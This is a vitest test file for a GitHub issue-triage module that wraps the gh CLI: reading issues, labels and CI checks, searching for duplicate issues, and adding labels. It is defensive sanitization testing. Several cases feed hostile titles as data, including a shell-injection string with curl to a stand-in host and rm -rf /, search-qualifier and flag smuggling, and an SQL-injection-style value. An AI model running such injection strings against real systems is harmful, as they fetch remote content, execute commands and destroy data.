import { describe, expect, test } from "vitest";
import { parseGh } from "#lib/github/cli.js";
import {
  applyLabels,
  DUPLICATE_FETCH_LIMIT,
  DUPLICATE_SEARCH_TERMS,
  duplicateSearchQuery,
  type FailingCheck,
  fetchChecks,
  fetchFailedLogs,
  fetchIssue,
  fetchLabels,
  findDuplicateCandidates,
  type GhRunner,
  LABEL_FETCH_LIMIT,
  MAX_RUNS_READ,
  runIdFromLink,
} from "#lib/triage/github.js";

type GhAnswer = Partial<Awaited<ReturnType<GhRunner>>>;

/**
 * A fixture-backed `gh`: records every argv and answers from `answer`.
 * Unspecified fields default to a clean, empty success.
 */
const fakeGh = (answer: (args: readonly string[]) => GhAnswer = () => ({})) => {
  const calls: string[][] = [];
  const gh: GhRunner = (args) => {
    calls.push([...args]);
    return Promise.resolve({
      exitCode: 0,
      stderr: "",
      stdout: "",
      ...answer(args),
    });
  };
  return { calls, gh };
};

const jsonAnswer = (value: unknown): GhAnswer => ({
  stdout: JSON.stringify(value),
});

/**
 * The effect the production allowlist assigns to a recorded argv. The triage
 * tools pass every command through `parseGh`, so a command it refuses would
 * never run.
 */
const effectKind = (argv: readonly string[]): string => {
  const parsed = parseGh(argv);
  return parsed.ok
    ? parsed.invocation.effect.kind
    : `refused: ${parsed.reason}`;
};

const failingCheck = (runId: string | null, name = "test"): FailingCheck => ({
  link:
    runId === null
      ? null
      : `https://github.com/acme/widgets/actions/runs/${runId}`,
  name,
  runId,
  workflow: "CI",
});

describe("fetchIssue", () => {
  test("reads the title, body, state, and label names of one issue", async () => {
    const { calls, gh } = fakeGh(() =>
      jsonAnswer({
        body: "Sign in returns a 500.",
        labels: [
          { color: "d73a4a", id: "L_1", name: "bug" },
          { color: "ededed", id: "L_2", name: "area: auth" },
        ],
        number: 12,
        state: "OPEN",
        title: "Login returns 500",
      })
    );

    await expect(fetchIssue(gh, 12)).resolves.toEqual({
      body: "Sign in returns a 500.",
      labels: ["bug", "area: auth"],
      number: 12,
      state: "OPEN",
      title: "Login returns 500",
    });
    expect(calls).toEqual([
      ["issue", "view", "12", "--json", "number,title,body,state,labels"],
    ]);
    expect(calls.map(effectKind)).toEqual(["read"]);
  });

  test("keeps only label entries that carry a string name", async () => {
    const { gh } = fakeGh(() =>
      jsonAnswer({
        labels: [
          { name: "bug" },
          null,
          {},
          { name: 7 },
          "docs",
          { name: "p1" },
        ],
        title: "t",
      })
    );

    expect((await fetchIssue(gh, 1)).labels).toEqual(["bug", "p1"]);
  });

  test("treats a labels field that is not a list as no labels", async () => {
    const { gh } = fakeGh(() => jsonAnswer({ labels: "bug", title: "t" }));

    expect((await fetchIssue(gh, 1)).labels).toEqual([]);
  });

  test.each([
    ["missing", { title: "No description" }],
    ["null", { body: null, title: "No description" }],
  ])("reads a %s body as the empty string", async (_case, issue) => {
    const { gh } = fakeGh(() => jsonAnswer(issue));

    expect((await fetchIssue(gh, 3)).body).toBe("");
  });

  test("reports the state as UNKNOWN when gh returns none", async () => {
    const { gh } = fakeGh(() => jsonAnswer({ title: "t" }));

    expect((await fetchIssue(gh, 3)).state).toBe("UNKNOWN");
  });

  test("returns the number that was asked for, not one echoed in the output", async () => {
    const { gh } = fakeGh(() => jsonAnswer({ number: 999, title: "t" }));

    expect((await fetchIssue(gh, 3)).number).toBe(3);
  });

  test("throws naming the issue, the exit code, and gh's stderr on a non-zero exit", async () => {
    const { gh } = fakeGh(() => ({
      exitCode: 1,
      stderr:
        "GraphQL: Could not resolve to an Issue with the number of 404.\n",
    }));

    const failure = fetchIssue(gh, 404);
    await expect(failure).rejects.toThrow(/issue #404/);
    await expect(failure).rejects.toThrow(/exit 1/);
    await expect(failure).rejects.toThrow(/Could not resolve to an Issue/);
  });

  test("throws even when a failed gh still printed a well-formed issue", async () => {
    const { gh } = fakeGh(() => ({
      ...jsonAnswer({ title: "stale" }),
      exitCode: 4,
      stderr: "HTTP 401",
    }));

    await expect(fetchIssue(gh, 5)).rejects.toThrow(
      /issue #5.*exit 4.*HTTP 401/
    );
  });

  test.each([
    ["output that is not JSON", "<html>502 Bad Gateway</html>"],
    ["empty output", ""],
    ["a JSON null", "null"],
    ["an issue without a title", JSON.stringify({ body: "b", state: "OPEN" })],
    ["a title that is not a string", JSON.stringify({ title: 42 })],
  ])("throws naming the issue on %s", async (_case, stdout) => {
    const { gh } = fakeGh(() => ({ stdout }));

    await expect(fetchIssue(gh, 12)).rejects.toThrow(
      /Reading issue #12 failed/
    );
  });

  test("bounds how much of gh's stderr reaches the error message", async () => {
    const { gh } = fakeGh(() => ({ exitCode: 1, stderr: "x".repeat(5000) }));

    const error = await fetchIssue(gh, 1).catch((caught: unknown) => caught);
    expect(error).toBeInstanceOf(Error);
    // 500 characters of gh's output after the fixed preamble, and no more.
    expect((error as Error).message).toBe(
      `Reading issue #1 failed (gh exit 1): ${"x".repeat(500)}`
    );
  });
});

describe("fetchLabels", () => {
  test("returns the vocabulary with names and descriptions", async () => {
    const { calls, gh } = fakeGh(() =>
      jsonAnswer([
        { description: "Something isn't working", name: "bug" },
        { description: "Authentication and sessions", name: "area: auth" },
      ])
    );

    await expect(fetchLabels(gh)).resolves.toEqual([
      { description: "Something isn't working", name: "bug" },
      { description: "Authentication and sessions", name: "area: auth" },
    ]);
    // The limit is written out, not read from LABEL_FETCH_LIMIT, so shrinking
    // the vocabulary triage sees fails here.
    expect(calls).toEqual([
      ["label", "list", "--json", "name,description", "--limit", "100"],
    ]);
    expect(LABEL_FETCH_LIMIT).toBe(100);
    expect(calls.map(effectKind)).toEqual(["read"]);
  });

  test("drops entries without a string name", async () => {
    const { gh } = fakeGh(() =>
      jsonAnswer([
        { description: "kept", name: "bug" },
        { description: "nameless" },
        null,
        "docs",
        { name: null },
        { name: 3 },
        { name: "p1" },
      ])
    );

    expect((await fetchLabels(gh)).map((label) => label.name)).toEqual([
      "bug",
      "p1",
    ]);
  });

  test("reports a missing, null, or non-string description as null", async () => {
    const { gh } = fakeGh(() =>
      jsonAnswer([
        { name: "missing" },
        { description: null, name: "null" },
        { description: 5, name: "number" },
        { description: "", name: "empty" },
      ])
    );

    await expect(fetchLabels(gh)).resolves.toEqual([
      { description: null, name: "missing" },
      { description: null, name: "null" },
      { description: null, name: "number" },
      { description: "", name: "empty" },
    ]);
  });

  test("returns an empty vocabulary for a repository with no labels", async () => {
    const { gh } = fakeGh(() => jsonAnswer([]));

    await expect(fetchLabels(gh)).resolves.toEqual([]);
  });

  test("throws with gh's stderr on a non-zero exit", async () => {
    const { gh } = fakeGh(() => ({
      ...jsonAnswer([{ name: "bug" }]),
      exitCode: 1,
      stderr: "HTTP 403: Resource not accessible by integration",
    }));

    await expect(fetchLabels(gh)).rejects.toThrow(
      /Listing labels failed \(gh exit 1\): HTTP 403/
    );
  });

  test.each([
    ["not JSON", "no labels found"],
    ["a JSON object instead of a list", "{}"],
  ])("throws when the output is %s", async (_case, stdout) => {
    const { gh } = fakeGh(() => ({ stdout }));

    await expect(fetchLabels(gh)).rejects.toThrow(/Listing labels failed/);
  });
});

/** Splits a duplicate-search query into its terms, checking its overall shape. */
const termsOf = (query: string | null): string[] => {
  if (query === null) {
    throw new Error("expected a query");
  }
  expect(query.endsWith(" in:title")).toBe(true);
  return query.slice(0, -" in:title".length).split(" OR ");
};

const PLAIN_WORD = /^[a-z0-9][a-z0-9_-]*$/;
const QUERY_SHAPE =
  /^[a-z0-9][a-z0-9_-]*(?: OR [a-z0-9][a-z0-9_-]*)* in:title$/;

describe("duplicateSearchQuery", () => {
  test("joins the title's words with OR and restricts the search to titles", () => {
    expect(duplicateSearchQuery("Login returns 500")).toBe(
      "login OR returns OR 500 in:title"
    );
  });

  test("drops stop words and words shorter than three characters", () => {
    expect(
      duplicateSearchQuery("The error when you cannot log in to our dashboard")
    ).toBe("log OR dashboard in:title");
  });

  test("matches stop words case-insensitively", () => {
    expect(duplicateSearchQuery("ISSUE With THE Checkout")).toBe(
      "checkout in:title"
    );
  });

  test("uses each word once, whatever its case", () => {
    expect(duplicateSearchQuery("Crash crash CRASH on startup Startup")).toBe(
      "crash OR startup in:title"
    );
  });

  test("keeps hyphenated and underscored identifiers whole", () => {
    expect(duplicateSearchQuery("rate-limit max_retries ignored")).toBe(
      "rate-limit OR max_retries OR ignored in:title"
    );
  });

  test("keeps at most DUPLICATE_SEARCH_TERMS terms, preferring the longest", () => {
    const terms = termsOf(
      duplicateSearchQuery(
        "tiny abcd abcdefghij abcdefghi abcdefgh abcdefg abcdef abcde"
      )
    );

    expect(DUPLICATE_SEARCH_TERMS).toBe(5);
    expect(terms).toEqual([
      "abcdefghij",
      "abcdefghi",
      "abcdefgh",
      "abcdefg",
      "abcdef",
    ]);
  });

  test("lists the chosen terms in title order, not length order", () => {
    expect(
      duplicateSearchQuery(
        "zeta kappa-long delta epsilon bb1 eta123 theta alpha"
      )
    ).toBe("kappa-long OR delta OR epsilon OR eta123 OR theta in:title");
  });

  test("breaks length ties in favour of the words that come first", () => {
    const terms = termsOf(
      duplicateSearchQuery("aaaa bbbb cccc dddd eeee ffff gggg")
    );

    expect(terms).toEqual(["aaaa", "bbbb", "cccc", "dddd", "eeee"]);
  });

  test.each([
    ["an empty title", ""],
    ["whitespace", "   \n\t "],
    ["punctuation", "!!! ??? ... --- ___"],
    ["only stop words", "The issue with this error"],
    ["only short words", "it is on at 42 no go"],
    ["only non-ASCII words", "Ошибка входа 登录失败"],
    ["only qualifier syntax", ':: @@ "" -- //'],
  ])("returns null for %s", (_case, title) => {
    expect(duplicateSearchQuery(title)).toBeNull();
  });

  test("reduces a title made of search qualifiers to plain words", () => {
    expect(
      duplicateSearchQuery('repo:evil/x author:@me "quoted" is:open')
    ).toBe("repo OR evil OR author OR quoted OR open in:title");
  });

  test.each([
    ['repo:evil/x author:@me "quoted" is:open'],
    ["-label:bug -repo:acme/widgets NOT crash"],
    ["--repo evil/secrets --json token"],
    ["org:evil user:evil in:body,comments is:pr is:private"],
    ['"exact phrase" (grouped OR terms) AND -excluded'],
    ['label:"needs triage" milestone:"v1" sort:updated-desc'],
    ["crash\nrepo:evil/x\r\nauthor:victim"],
    ["crash\tin:body\u0000repo:evil/x"],
    ["crash in:title in:body in:comments"],
    ["created:>2020-01-01 comments:>=5 stars:10..20"],
    ["$(curl evil.test) `id` ; rm -rf / | cat && true"],
    ["repo\u200b:evil/x \uff52\uff45\uff50\uff4f:evil/y repo\uff1aevil/z"],
    ["' OR 1=1 -- \\ %22repo:evil/x%22"],
  ])(
    "builds only plain words joined by OR from the hostile title %j",
    (title) => {
      const query = duplicateSearchQuery(title);
      const terms = termsOf(query);

      expect(terms.length).toBeGreaterThan(0);
      expect(terms.length).toBeLessThanOrEqual(DUPLICATE_SEARCH_TERMS);
      for (const term of terms) {
        expect(term).toMatch(PLAIN_WORD);
      }
      // The one qualifier in the query is the trailing one this module wrote.
      expect(query?.match(/:/g)).toHaveLength(1);
      expect(query).toMatch(QUERY_SHAPE);
    }
  );

  test("never lets a title start the query with a dash, which gh would read as a flag", () => {
    expect(duplicateSearchQuery("--repo evil/secrets")).toBe(
      "repo OR evil OR secrets in:title"
    );
    expect(duplicateSearchQuery("-crash ---startup")).toBe(
      "crash OR startup in:title"
    );
  });

  test("lowercases the boolean operators so a title cannot negate or group terms", () => {
    const terms = termsOf(
      duplicateSearchQuery("crash NOT startup AND shutdown")
    );

    expect(terms).toEqual(["crash", "startup", "shutdown"]);
  });

  test("stays bounded for a very long title", () => {
    const title = Array.from(
      { length: 5000 },
      (_, index) => `word${index}`
    ).join(" ");

    expect(termsOf(duplicateSearchQuery(title))).toHaveLength(
      DUPLICATE_SEARCH_TERMS
    );
  });
});

describe("findDuplicateCandidates", () => {
  const ISSUES = [
    { number: 7, state: "OPEN", title: "Login returns 500 after deploy" },
    { number: 12, state: "OPEN", title: "Login returns 500" },
    { number: 3, state: "CLOSED", title: "Login page 500s" },
  ];

  test("searches open and closed issues with the title's query", async () => {
    const { calls, gh } = fakeGh(() => jsonAnswer(ISSUES));

    await findDuplicateCandidates(gh, "Login returns 500", null);

    expect(calls).toEqual([
      [
        "issue",
        "list",
        "--state",
        "all",
        "--search",
        "login OR returns OR 500 in:title",
        "--json",
        "number,title,state",
        "--limit",
        "15",
      ],
    ]);
    expect(DUPLICATE_FETCH_LIMIT).toBe(15);
    expect(calls.map(effectKind)).toEqual(["read"]);
  });

  test("returns every match when there is no issue to exclude", async () => {
    const { gh } = fakeGh(() => jsonAnswer(ISSUES));

    await expect(
      findDuplicateCandidates(gh, "Login returns 500", null)
    ).resolves.toEqual(ISSUES);
  });

  test("excludes the issue being triaged from its own candidates", async () => {
    const { gh } = fakeGh(() => jsonAnswer(ISSUES));

    const candidates = await findDuplicateCandidates(
      gh,
      "Login returns 500",
      12
    );

    expect(candidates.map((candidate) => candidate.number)).toEqual([7, 3]);
  });

  test("passes a hostile title to gh as one sanitized --search value", async () => {
    const { calls, gh } = fakeGh(() => jsonAnswer([]));

    await findDuplicateCandidates(
      gh,
      'repo:evil/x author:@me "quoted" is:open --repo evil/x',
      null
    );

    // The whole argv: the title contributes one value and nothing else.
    expect(calls).toEqual([
      [
        "issue",
        "list",
        "--state",
        "all",
        "--search",
        "repo OR evil OR author OR quoted OR open in:title",
        "--json",
        "number,title,state",
        "--limit",
        "15",
      ],
    ]);
    expect(calls.map(effectKind)).toEqual(["read"]);
  });

  test("does not call gh when the title has no usable words", async () => {
    const { calls, gh } = fakeGh(() => jsonAnswer(ISSUES));

    await expect(findDuplicateCandidates(gh, "?!", null)).resolves.toEqual([]);
    expect(calls).toEqual([]);
  });

  test("returns no candidates when gh fails, even if it printed some", async () => {
    const { gh } = fakeGh(() => ({
      ...jsonAnswer(ISSUES),
      exitCode: 1,
      stderr: "HTTP 422: Validation Failed",
    }));

    await expect(
      findDuplicateCandidates(gh, "Login returns 500", null)
    ).resolves.toEqual([]);
  });

  test.each([
    ["not JSON", "rate limit exceeded"],
    ["empty", ""],
    ["a JSON object", '{"message":"Bad credentials"}'],
    ["a JSON null", "null"],
  ])("returns no candidates when the output is %s", async (_case, stdout) => {
    const { gh } = fakeGh(() => ({ stdout }));

    await expect(
      findDuplicateCandidates(gh, "Login returns 500", null)
    ).resolves.toEqual([]);
  });

  test("skips entries without a numeric number and a string title", async () => {
    const { gh } = fakeGh(() =>
      jsonAnswer([
        null,
        "7",
        { title: "no number" },
        { number: "8", title: "number is a string" },
        { number: 9 },
        { number: 10, title: null },
        { number: 11, title: "kept" },
      ])
    );

    await expect(
      findDuplicateCandidates(gh, "Login returns 500", null)
    ).resolves.toEqual([{ number: 11, title: "kept" }]);
  });

  test("carries the state only when gh returned one as a string", async () => {
    const { gh } = fakeGh(() =>
      jsonAnswer([
        { number: 1, state: "CLOSED", title: "a" },
        { number: 2, state: null, title: "b" },
        { number: 3, title: "c" },
      ])
    );

    await expect(
      findDuplicateCandidates(gh, "Login returns 500", null)
    ).resolves.toEqual([
      { number: 1, state: "CLOSED", title: "a" },
      { number: 2, title: "b" },
      { number: 3, title: "c" },
    ]);
  });

  test("returns only the fields triage uses, dropping anything else gh sent", async () => {
    const { gh } = fakeGh(() =>
      jsonAnswer([
        {
          author: { login: "mallory" },
          body: "x",
          number: 1,
          state: "OPEN",
          title: "a",
        },
      ])
    );

    await expect(
      findDuplicateCandidates(gh, "Login returns 500", null)
    ).resolves.toEqual([{ number: 1, state: "OPEN", title: "a" }]);
  });
});

describe("applyLabels", () => {
  test("adds each missing label with its own --add-label flag", async () => {
    const { calls, gh } = fakeGh();

    const added = await applyLabels(gh, { labels: [], number: 12 }, [
      "bug",
      "area: auth",
      "priority: high",
    ]);

    expect(added).toEqual(["bug", "area: auth", "priority: high"]);
    expect(calls).toEqual([
      [
        "issue",
        "edit",
        "12",
        "--add-label",
        "bug",
        "--add-label",
        "area: auth",
        "--add-label",
        "priority: high",
      ],
    ]);
    expect(effectKind(calls[0] ?? [])).toBe("label");
  });

  test("skips labels the issue already has and reports only the ones it added", async () => {
    const { calls, gh } = fakeGh();

    const added = await applyLabels(
      gh,
      { labels: ["bug", "needs triage"], number: 12 },
      ["bug", "area: auth"]
    );

    expect(added).toEqual(["area: auth"]);
    expect(calls).toEqual([
      ["issue", "edit", "12", "--add-label", "area: auth"],
    ]);
  });

  test("makes no gh call when every label is already present", async () => {
    const { calls, gh } = fakeGh();

    await expect(
      applyLabels(gh, { labels: ["bug", "area: auth"], number: 12 }, [
        "area: auth",
        "bug",
      ])
    ).resolves.toEqual([]);
    expect(calls).toEqual([]);
  });

  test("makes no gh call when there are no labels to apply", async () => {
    const { calls, gh } = fakeGh();

    await expect(
      applyLabels(gh, { labels: ["bug"], number: 12 }, [])
    ).resolves.toEqual([]);
    expect(calls).toEqual([]);
  });

  test("compares label names exactly, so a different case is still added", async () => {
    const { calls, gh } = fakeGh();

    await expect(
      applyLabels(gh, { labels: ["Bug"], number: 4 }, ["bug"])
    ).resolves.toEqual(["bug"]);
    expect(calls).toEqual([["issue", "edit", "4", "--add-label", "bug"]]);
  });

  test("keeps a label containing a comma as a single flag value", async () => {
    const { calls, gh } = fakeGh();

    await applyLabels(gh, { labels: [], number: 4 }, ["help wanted, urgent"]);

    expect(calls).toEqual([
      ["issue", "edit", "4", "--add-label", "help wanted, urgent"],
    ]);
  });

  test("throws naming the issue and gh's stderr when the edit fails", async () => {
    const { gh } = fakeGh(() => ({
      exitCode: 1,
      stderr: "could not add label: 'area: auth' not found\n",
    }));

    await expect(
      applyLabels(gh, { labels: [], number: 12 }, ["area: auth"])
    ).rejects.toThrow(
      /Labeling issue #12 failed \(gh exit 1\): could not add label: 'area: auth' not found$/
    );
  });
});

describe("runIdFromLink", () => {
  test.each([
    ["https://github.com/acme/widgets/actions/runs/991/job/2233", "991"],
    [
      "https://github.com/acme/widgets/actions/runs/1234567890123",
      "1234567890123",
    ],
    ["https://github.com/acme/widgets/actions/runs/42/", "42"],
    ["https://github.com/acme/widgets/actions/runs/42/attempts/2", "42"],
  ])("reads the run id out of %s", (link, runId) => {
    expect(runIdFromLink(link)).toBe(runId);
  });

  test.each([
    ["a check with no link", null],
    ["an empty link", ""],
    ["an external CI link", "https://ci.example.com/builds/991"],
    ["a check-run link", "https://github.com/acme/widgets/runs/991"],
    [
      "a workflow link",
      "https://github.com/acme/widgets/actions/workflows/ci.yml",
    ],
    [
      "a run id that is not numeric",
      "https://github.com/acme/widgets/actions/runs/latest",
    ],
    [
      "a run id with a non-numeric tail",
      "https://github.com/acme/widgets/actions/runs/991abc",
    ],
    ["a run path with no id", "https://github.com/acme/widgets/actions/runs/"],
  ])("returns null for %s", (_case, link) => {
    expect(runIdFromLink(link)).toBeNull();
  });
});

describe("fetchChecks", () => {
  const CHECKS = [
    {
      bucket: "pass",
      link: "https://github.com/acme/widgets/actions/runs/100/job/1",
      name: "lint",
      state: "SUCCESS",
      workflow: "CI",
    },
    {
      bucket: "fail",
      link: "https://github.com/acme/widgets/actions/runs/100/job/2",
      name: "test",
      state: "FAILURE",
      workflow: "CI",
    },
    {
      bucket: "pending",
      link: "https://github.com/acme/widgets/actions/runs/101/job/3",
      name: "e2e",
      state: "IN_PROGRESS",
      workflow: "E2E",
    },
    {
      bucket: "skipping",
      link: "https://github.com/acme/widgets/actions/runs/100/job/4",
      name: "deploy",
      state: "SKIPPED",
      workflow: "CI",
    },
    {
      bucket: "cancel",
      link: "https://github.com/acme/widgets/actions/runs/102/job/5",
      name: "nightly",
      state: "CANCELLED",
      workflow: "Nightly",
    },
  ];

  test("summarises the checks: failing ones in detail; pending, cancelled, and total as counts", async () => {
    const { calls, gh } = fakeGh(() => jsonAnswer(CHECKS));

    await expect(fetchChecks(gh, 34)).resolves.toEqual({
      cancelled: 1,
      failing: [
        {
          link: "https://github.com/acme/widgets/actions/runs/100/job/2",
          name: "test",
          runId: "100",
          workflow: "CI",
        },
      ],
      pending: 1,
      total: 5,
    });
    expect(calls).toEqual([
      ["pr", "checks", "34", "--json", "name,state,bucket,link,workflow"],
    ]);
    expect(calls.map(effectKind)).toEqual(["read"]);
  });

  test("still reads the checks when gh exits non-zero, as it does for failing or pending checks", async () => {
    const { gh } = fakeGh(() => ({ ...jsonAnswer(CHECKS), exitCode: 1 }));
    const pendingExit = fakeGh(() => ({ ...jsonAnswer(CHECKS), exitCode: 8 }));

    expect(
      (await fetchChecks(gh, 34)).failing.map((check) => check.name)
    ).toEqual(["test"]);
    expect((await fetchChecks(pendingExit.gh, 34)).pending).toBe(1);
  });

  test.each([
    ["pass"],
    ["pending"],
    ["skipping"],
    ["cancel"],
    ["FAIL"],
    [""],
    [null],
  ])("does not count a check in bucket %j as failing", async (bucket) => {
    const { gh } = fakeGh(() =>
      jsonAnswer([{ bucket, name: "x", state: "FAILURE" }])
    );

    const summary = await fetchChecks(gh, 1);

    expect(summary.failing).toEqual([]);
    expect(summary.total).toBe(1);
  });

  test("counts every pending check", async () => {
    const { gh } = fakeGh(() =>
      jsonAnswer([
        { bucket: "pending", name: "a" },
        { bucket: "pending", name: "b" },
        { bucket: "fail", name: "c" },
        { bucket: "pending", name: "d" },
      ])
    );

    await expect(fetchChecks(gh, 1)).resolves.toMatchObject({
      pending: 3,
      total: 4,
    });
  });

  test("fills in a failing check that is missing its name, link, or workflow", async () => {
    const { gh } = fakeGh(() =>
      jsonAnswer([
        { bucket: "fail" },
        { bucket: "fail", link: 5, name: null, workflow: "" },
        {
          bucket: "fail",
          link: "https://ci.example.com/builds/9",
          name: "external",
        },
      ])
    );

    expect((await fetchChecks(gh, 1)).failing).toEqual([
      { link: null, name: "unknown", runId: null, workflow: null },
      { link: null, name: "unknown", runId: null, workflow: "" },
      {
        link: "https://ci.example.com/builds/9",
        name: "external",
        runId: null,
        workflow: null,
      },
    ]);
  });

  test("reports a pull request with no checks as an empty summary", async () => {
    const { gh } = fakeGh(() => jsonAnswer([]));

    await expect(fetchChecks(gh, 1)).resolves.toEqual({
      cancelled: 0,
      failing: [],
      pending: 0,
      total: 0,
    });
  });

  test('treats gh\'s "no checks reported" error as an empty summary, not a failure', async () => {
    const { gh } = fakeGh(() => ({
      exitCode: 1,
      stderr: "no checks reported on the 'factory/bug-x' branch",
      stdout: "",
    }));

    await expect(fetchChecks(gh, 34)).resolves.toEqual({
      cancelled: 0,
      failing: [],
      pending: 0,
      total: 0,
    });
  });

  test.each([
    ["not JSON", "no checks reported on the 'factory/x' branch"],
    ["empty", ""],
    ["a JSON object", '{"message":"Not Found"}'],
  ])(
    "throws naming the pull request when the output is %s",
    async (_case, stdout) => {
      const { gh } = fakeGh(() => ({
        exitCode: 1,
        stderr: "no pull requests found for branch",
        stdout,
      }));

      await expect(fetchChecks(gh, 34)).rejects.toThrow(
        /Reading checks for #34 failed \(gh exit 1\): no pull requests found/
      );
    }
  );
});

describe("fetchFailedLogs", () => {
  test("reads the failed-step log of each failing run and joins them", async () => {
    const { calls, gh } = fakeGh((args) => ({
      stdout: `log of run ${args[2]}`,
    }));

    await expect(
      fetchFailedLogs(gh, [failingCheck("100"), failingCheck("200")])
    ).resolves.toBe("log of run 100\nlog of run 200");
    expect(calls).toEqual([
      ["run", "view", "100", "--log-failed"],
      ["run", "view", "200", "--log-failed"],
    ]);
    expect(calls.map(effectKind)).toEqual(["read", "read"]);
  });

  test("reads a run once even when several failing checks share it", async () => {
    const { calls, gh } = fakeGh(() => ({ stdout: "boom" }));

    await expect(
      fetchFailedLogs(gh, [
        failingCheck("100", "unit"),
        failingCheck("100", "integration"),
        failingCheck("100", "lint"),
      ])
    ).resolves.toBe("boom");
    expect(calls).toEqual([["run", "view", "100", "--log-failed"]]);
  });

  test("reads at most MAX_RUNS_READ distinct runs, the first ones listed", async () => {
    const { calls, gh } = fakeGh((args) => ({ stdout: `log ${args[2]}` }));
    const failing = ["100", "100", "200", "300", "400", "500"].map((id) =>
      failingCheck(id)
    );

    const logs = await fetchFailedLogs(gh, failing);

    // Two runs, written out: raising MAX_RUNS_READ in the source fails here.
    expect(MAX_RUNS_READ).toBe(2);
    expect(calls).toEqual([
      ["run", "view", "100", "--log-failed"],
      ["run", "view", "200", "--log-failed"],
    ]);
    expect(logs).toBe("log 100\nlog 200");
  });

  test("ignores failing checks that have no run behind them", async () => {
    const { calls, gh } = fakeGh((args) => ({ stdout: `log ${args[2]}` }));

    await expect(
      fetchFailedLogs(gh, [
        failingCheck(null, "external"),
        failingCheck("100"),
        failingCheck(null, "vercel"),
      ])
    ).resolves.toBe("log 100");
    expect(calls).toHaveLength(1);
  });

  test("returns an empty string without calling gh when no check has a run", async () => {
    const { calls, gh } = fakeGh(() => ({ stdout: "unexpected" }));

    await expect(fetchFailedLogs(gh, [failingCheck(null)])).resolves.toBe("");
    await expect(fetchFailedLogs(gh, [])).resolves.toBe("");
    expect(calls).toEqual([]);
  });

  test("skips a run whose log cannot be read and keeps the others", async () => {
    const { calls, gh } = fakeGh((args) =>
      args[2] === "100"
        ? { exitCode: 1, stderr: "log not found", stdout: "partial output" }
        : { stdout: "real failure log" }
    );

    await expect(
      fetchFailedLogs(gh, [failingCheck("100"), failingCheck("200")])
    ).resolves.toBe("real failure log");
    expect(calls).toHaveLength(2);
  });

  test("skips a run whose log is blank", async () => {
    const { gh } = fakeGh((args) => ({
      stdout: args[2] === "100" ? "  \n\t\n" : "real failure log",
    }));

    await expect(
      fetchFailedLogs(gh, [failingCheck("100"), failingCheck("200")])
    ).resolves.toBe("real failure log");
  });

  test("returns an empty string when no run's log can be read", async () => {
    const { gh } = fakeGh(() => ({
      exitCode: 1,
      stderr: "HTTP 410: logs expired",
    }));

    await expect(
      fetchFailedLogs(gh, [failingCheck("100"), failingCheck("200")])
    ).resolves.toBe("");
  });
});
